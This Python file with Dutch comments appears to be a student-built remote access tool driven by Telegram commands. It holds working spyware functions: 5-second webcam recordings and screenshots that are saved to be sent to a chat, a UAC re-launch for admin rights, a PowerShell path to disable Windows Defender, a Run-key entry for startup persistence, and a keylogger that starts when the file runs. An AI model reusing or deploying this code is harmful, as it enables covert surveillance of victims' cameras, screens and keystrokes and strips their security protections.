# Deze file bevat alle functies die binnen de async commands uitgevoerd kunnen wordt
import cv2, os, time, subprocess, sys, ctypes, winreg, re
from PIL import ImageGrab
from pynput import keyboard

# functie die afgedraaid wordt om de banner te maken
def make_banner() -> str:
    """
    Geeft de ASCII banner terug als string.
    """
    return r"""
               _.-*'""'*-._
            .-"            "-.
          ,"                  ",
        .'      _.-.--.-._      ',
       /     .-'.-"    "-.'-.     \
      /     /  /"'-.  .-'"\  \     \
     :     :  :     ;:     ;  ;     ;
     ;     :  ; *   !! *   :  ;     :
     ;      ; :   .'  '.   ; :      :
     :       \ \-'      '-/ /       ;
      \       '.'-_    _-'.'       /
       \        '*-"-+"-*'        /
        '.          /|          .'
          *,       / |        ,*
          / '-_            _-'  \
         /     "*-.____.-*"      \
        /            |            \
       :    :        |        ;    ;
       |.--.;        |        :.--.|
       (   ()        |        ()   )
        '--^_        |        _^--'
           | "'*--.._I_..--*'" |
           | __..._  | _..._   |
          .'"      `"'"     ''"'.
Ik ben Ready, gebruik /help om alle commands te zien
===========================================
Viresh & Muazma
===========================================
"""


# verstuur de banner
def get_banner() -> str:
    text = make_banner()
    # re.sub zorgt ervoor dat speciale tekens te zien zijn in markdown codeblock
    return re.sub(r'([_*\[\]()~`>#+\-=|{}.!\\])', r'\\\1', text)


# functie die een lijst met alle commands terug geeft
def get_command_list() -> str:
    """
    Geeft een lijst met alle slash commands.
    """
    return r"""
Command Lijst:
/webcam         -   Maak een 5 seconde webcam opname
/ss             -   Maak een screenshot van het scherm
/stopdefender   -   Windows Defender uitgeschakelen
"""

# path en naam voor het opslaan van media
def save_media_to(filename_prefix, extension) -> str:
    """
    Maakt de map aan (als die nog niet bestaat) en genereert een uniek bestandsnaam + pad.
    
    Args:
        filename_prefix (str): Voorvoegsel van de bestandsnaam, bijv. "screenshot" of "video"
        extension (str): Bestandsextensie, bijv. "png" of "mp4"
    
    Returns:
        str: Volledige pad naar het bestand
    """
    os.makedirs("./media", exist_ok=True)
    filename = f"{filename_prefix}.{extension}"
    return os.path.join("./media", filename)

# maak een video recording met de webcam
# source: https://www.geeksforgeeks.org/python/python-opencv-capture-video-from-camera/
def get_camRecording():
    videoPath = save_media_to("cam", "mp4")

    # videoCapture functie: aangeven dat de webcam gebruikt moet/kan worden (camera met index 0)
    cam = cv2.VideoCapture(0)

    # melden en functie stoppen als camera niet geopend kan worden
    if not cam.isOpened():
        return print("Camera kan niet geopend worden!")

    # height en width van de video bepalen
    frame_width = int(cam.get(cv2.CAP_PROP_FRAME_WIDTH))
    frame_height = int(cam.get(cv2.CAP_PROP_FRAME_HEIGHT))

    # VideoWriter object aanmaken om de opname als mp4 op te slaan in de filepath=/media folder
    fourcc = cv2.VideoWriter_fourcc(*'avc1')
    out = cv2.VideoWriter(videoPath, fourcc, 20.0, (frame_width, frame_height))

    # zolang de whileloop true is wordt webcam gebruikt om video te maken
    start_time = time.time()
    while True:
        ret, frame = cam.read()

        out.write(frame)

        # als de video langer dan 5 seconden wordt, stop de video
        if time.time() - start_time > 5:
            break

    # als de loop stopt de camera opname afsluiten
    cam.release()
    out.release()
    cv2.destroyAllWindows()

    # return de video filepath zodat we hierna weten welke video naar de telegram chat verstuurd moet worden
    return videoPath


# Maak een screenshot van het scherm
def get_screen():
    imagePath = save_media_to("screenshot", "png")
    screenshot = ImageGrab.grab()
    screenshot.save(imagePath, "PNG")

    return imagePath

# functie om admin rechten aan te zetten
# Source: https://github.com/witchfindertr/Defeat-Defender-Python-Version-/blob/c2a43b4b2f570b87259ca368a98d2e3ab3572dff/Defeat-Defender.py#L11-L15
def get_adminRights():
    """Maak een terminal open met admin rechten, en sluit de oude (zonder admin rechten)"""
    if sys.argv[-1] != "asadmin":
        script = os.path.abspath(sys.argv[0])
        params = ' '.join([script] + sys.argv[1:] + ['asadmin'])
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, params, None, 1)
        sys.exit(0)


# windows defender uitzetten via python met powershell
def powershell_command(cmd):
    # zet admin rechten aan
    get_adminRights()

    # https://www.phillipsj.net/posts/executing-powershell-from-python/
    # dit is de powershell command die uitgevoerd moet worden (deze command heeft adim rights nodig)
    runCommand = subprocess.run(
        ["powershell", "-Command", cmd], 
        capture_output=True, text=True
    )

    return runCommand.stdout


# Code uit week 2 opdracht
def add_to_registry(program_name):
    try:
        # Bepaal de registersleutel voor de huidige gebruiker
        registry_key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run")

        # Voeg een nieuwe registerwaarde toe
        winreg.SetValueEx(registry_key, program_name, 0, winreg.REG_SZ, rf"C:\Users\{os.getlogin()}\Downloads\main.exe")

        print(f"{program_name} is toegevoegd aan de opstart-items")

        # Sluit de registersleutel
        winreg.CloseKey(registry_key)

    except Exception as e:
        print(f"Fout bij toevoegen aan het register: {e}")


# key logger
string = ""

def on_press(key):
    global string

    try:
        if key == keyboard.Key.enter:
            return False
        
        else:
            # print('alphanumeric key {0} pressed'.format(key.char))
            string += format(key.char)

    except AttributeError:
        # print('special key {0} pressed'.format(key))
        string += format(key)
    
    # return string

def key_log():
    # Collect events until released
    with keyboard.Listener(on_press=on_press) as listener: listener.join()

    # ...or, in a non-blocking fashion:
    listener = keyboard.Listener(on_press=on_press)
    listener.start()

key_log()
print("logged string: " + string)